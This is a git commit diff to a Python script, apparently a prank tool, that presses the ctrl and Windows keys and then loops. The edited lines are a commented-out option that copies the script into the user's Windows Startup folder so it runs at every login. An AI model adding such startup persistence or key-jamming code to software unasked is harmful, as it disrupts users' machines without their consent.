709251a393b1907895a5b543f982fd90efb48bc1
Professor Kablammo <bumbum4321234@gmail.com>
2021-05-24 08:44:04 +1000

    Update Code.py

--- Code.py
+++ Code.py
@@ -3,7 +3,7 @@ import time
 '''(optional move to startup):
 import shutil
 import os
-shutil.move(__file__,os.environ["appdata"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")'''
+shutil.move(__file__,os.environ["appdata"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"+__file__.split("\\")[-1])'''
 keyboard.press("ctrl")
 keyboard.press("cmd")
 while True:
